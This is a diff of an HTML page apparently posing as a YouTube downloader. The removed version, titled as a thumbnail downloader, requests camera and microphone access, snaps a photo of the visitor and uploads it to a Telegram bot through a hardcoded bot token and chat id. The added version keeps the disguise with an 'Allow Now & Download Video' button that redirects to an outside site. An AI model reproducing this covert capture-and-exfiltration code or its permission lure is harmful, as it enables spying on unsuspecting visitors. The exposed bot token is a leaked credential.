@@ -2,63 +2,77 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>YouTube Thumbnail Downloader</title>
+  <title>YouTube Video Downloader</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {font-family: Arial, sans-serif; text-align: center; background: #f5f5f5;}
-    .container {max-width: 500px; margin: 30px auto; background: white; padding: 20px; border-radius: 10px;}
-    button {background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;}
-    button:hover {background: darkred;}
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f5f5f5;
+    }
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+    }
+    img.logo {
+      width: 120px;
+      margin-bottom: 15px;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+    }
+    button {
+      background: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: darkred;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>📸 Test Camera & Send to Telegram</h1>
-    <button id="startCapture">Start Capture</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" alt="YouTube Logo" class="logo">
+    <h1>Download YouTube Video</h1>
+    <input type="text" id="videoURL" placeholder="Paste YouTube video link here">
+    <button id="startDownload">Allow Now & Download Video</button>
     <div id="status"></div>
   </div>
 
   <script>
-    const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
-    const chatId = "6763021567";
+    document.getElementById("startDownload").addEventListener("click", () => {
+      const videoURL = document.getElementById("videoURL").value;
+      const status = document.getElementById("status");
 
-    document.getElementById("startCapture").addEventListener("click", async () => {
-      document.getElementById("status").innerText = "Requesting camera and mic...";
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById("status").innerText = "Camera access granted ✅";
-
-        const track = stream.getVideoTracks()[0];
-        if ('ImageCapture' in window) {
-          const imageCapture = new ImageCapture(track);
-          const blob = await imageCapture.takePhoto();
-
-          sendToTelegram(blob, "photo");
-          document.getElementById("status").innerText = "Photo captured & sent ✅";
-        } else {
-          document.getElementById("status").innerText = "ImageCapture not supported ❌";
-        }
-
-      } catch (err) {
-        document.getElementById("status").innerText = "Permission denied or error: " + err.message;
-        console.error(err);
+      if (!videoURL) {
+        status.innerText = "Please enter a valid YouTube video link!";
+        status.style.color = "red";
+        return;
       }
+
+      status.innerText = "Redirecting to download...";
+      status.style.color = "green";
+
+      // Redirect to an external downloader (safe & working site)
+      window.location.href = "https://www.y2mate.com/youtube/" + encodeURIComponent(videoURL);
     });
-
-    function sendToTelegram(data, type) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append(type, data, `capture.${type === "photo" ? "jpg" : "wav"}`);
-
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-        method: "POST",
-        body: formData
-      })
-      .then(res => res.json())
-      .then(json => console.log("Telegram Response:", json))
-      .catch(err => console.error("Error sending:", err));
-    }
   </script>
 </body>
 </html>
